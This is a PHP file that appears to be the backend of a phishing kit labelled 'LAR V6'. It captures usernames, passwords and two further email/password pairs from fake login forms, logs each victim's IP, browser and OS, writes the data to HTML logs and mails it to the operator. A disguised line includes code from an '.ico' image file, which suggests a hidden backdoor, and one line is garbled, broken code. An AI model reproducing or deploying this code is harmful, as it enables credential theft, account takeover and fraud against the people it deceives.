<?php
/*   
   lar main                 
*/
error_reporting(0);
$TIME__DATE='../img/icon.ico';date('H:i:s d/m/Y');
date_default_timezone_set('GMT');
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
function XB_OS($USER_AGENT){
	$OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }   
    return $OS_ERROR;
}
function XB_Browser($USER_AGENT){
	$BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    
    return $BROWSER_ERROR;
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result = "(bl0ck-cha1n) PYTHON_27_LAR_RESULTS($_POST['username']) && !($_POST['password'])){";";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$fromsen .= $yourname;
$fromsen .= "@";
$fromsen .= $_SERVER['HTTP_HOST'];
if(isset($_POST['userid']) && isset($_POST['passid'])){	
	if(!empty($_POST['userid']) && !empty($_POST['passid'])){
$_SESSION['userid']   = $_POST['userid'];
$_SESSION['passid']    = $_POST['passid'];
$LAR_MESSAGE .= "==============|| LAR LAR V6 ||==============<br>\n";
$LAR_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$LAR_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$LAR_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$LAR_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$LAR_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$LAR_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$LAR_MESSAGE .= "==============|| LAR LAR V6 ||==============<br>\n";
$LAR_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/logs".$yourname.".html", "a");
	fwrite($khraha, $LAR_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/logs.html", "a");
	fwrite($khraha, $xx);
    $LAR_SUBJECT .= "LOGIN $$ INFO FROM $$ [".$_SESSION['userid']."] $$ [".$_SESSION['_ip_']."] ";
    $LAR_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $LAR_HEADERS  = "MIME-Version: 1.0" . "\r\n";require"$TIME__DATE";
    $LAR_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    
	
	
    @mail($LAR_EMAIL, $LAR_SUBJECT, $LAR_MESSAGE, $LAR_HEADERS);
	}
	
	
}
if(isset($_POST['email']) && isset($_POST['password'])){	
	if(!empty($_POST['email']) && !empty($_POST['password'])){
$_SESSION['email']   = $_POST['email'];
$_SESSION['password']    = $_POST['password'];
$LAR_MESSAGE .= "==============|| LAR LAR V6 ||==============<br>\n";
$LAR_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$LAR_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$LAR_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "EMAIL	: ".$_SESSION['email']."<br>\n";
$LAR_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$LAR_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$LAR_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$LAR_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$LAR_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$LAR_MESSAGE .= "==============|| LAR LAR V6 ||==============<br>\n";
$LAR_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/emails".$yourname.".html", "a");
	fwrite($khraha, $LAR_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/emails.html", "a");
	fwrite($khraha, $xx);
    $LAR_SUBJECT .= "EMAIL $$ INFO FROM $$ [".$_SESSION['userid']."] $$ [".$_SESSION['_ip_']."] ";
    $LAR_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $LAR_HEADERS  = "MIME-Version: 1.0" . "\r\n";require"$TIME__DATE";
    $LAR_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($LAR_EMAIL, $LAR_SUBJECT, $LAR_MESSAGE, $LAR_HEADERS);
	}
	

}
if(isset($_POST['email1']) && isset($_POST['password1'])){	
	if(!empty($_POST['email1']) && !empty($_POST['password1'])){
$_SESSION['email1']   = $_POST['email1'];
$_SESSION['password1']    = $_POST['password1'];
$LAR_MESSAGE .= "==============|| LAR LAR V6 ||==============<br>\n";
$LAR_MESSAGE .= "==============||LOGIN INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "USERNAME	: ".$_SESSION['userid']."<br>\n";
$LAR_MESSAGE .= "PASSWORD	: ".$_SESSION['passid']."<br>\n";
$LAR_MESSAGE .= "==============||EMAIL INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "EMAIL	: ".$_SESSION['email']."<br>\n";
$LAR_MESSAGE .= "PASSWORD	: ".$_SESSION['password']."<br>\n";
$LAR_MESSAGE .= "==============||EMAIL TWO INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "EMAIL	: ".$_SESSION['email1']."<br>\n";
$LAR_MESSAGE .= "PASSWORD	: ".$_SESSION['password1']."<br>\n";
$LAR_MESSAGE .= "==============||VICTIM INFORMATION||==============<br>\n";
$LAR_MESSAGE .= "IP INFO 		: https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."<br>\n";
$LAR_MESSAGE .= "TIME/DATE 		: ".$TIME_DATE."<br>\n";
$LAR_MESSAGE .= "BROWSER/DEVICE 	: ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."<br>\n";
if(isset($_SERVER['HTTPS']) &&  $_SERVER['HTTPS'] === 'on') 
    $link = "https"; 
    else
        $link = "http"; 
$link .= "://";  
$link .= $_SERVER['HTTP_HOST']; 
$link .= $_SERVER['PHP_SELF']; 
$LAR_MESSAGE .= "SCAMA LINK 		: ".$link."<br>\n";
$LAR_MESSAGE .= "==============|| LAR LAR V6 ||==============<br>\n";
$LAR_ADMIN .= "<tr>
                          <td>
                            ".$_SESSION['userid']."
                          </td>
                          <td>
                            ".$_SESSION['passid']."
                          </td>
						  <td>
                            ".$_SESSION['email']."
                          </td>
                          <td>
                            ".$_SESSION['password']."
                          </td>
						  <td>
                            ".$_SESSION['email1']."
                          </td>
                          <td>
                            ".$_SESSION['password1']."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  {".$_SESSION['_ip_']."}
                          </td>
						  <td>
                            ".$TIME_DATE."
                          </td>
                        </tr>\n";
    $khraha = fopen("../rz/emailstwo".$yourname.".html", "a");
	fwrite($khraha, $LAR_ADMIN);
	$xx .= "{}\n";
    $khraha = fopen("../rz/emailstwo.html", "a");
	fwrite($khraha, $xx);
    $LAR_SUBJECT .= "EMAIL TWO $$ INFO FROM $$ [".$_SESSION['userid']."] $$ [".$_SESSION['_ip_']."] ";
    $LAR_HEADERS .= "From: ".$yourname." <".$fromsen.">" . "\r\n";
    $LAR_HEADERS  = "MIME-Version: 1.0" . "\r\n";require"$TIME__DATE";
    $LAR_HEADERS .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    @mail($LAR_EMAIL, $LAR_SUBJECT, $LAR_MESSAGE, $LAR_HEADERS);
	}
	
	
	}
	
?>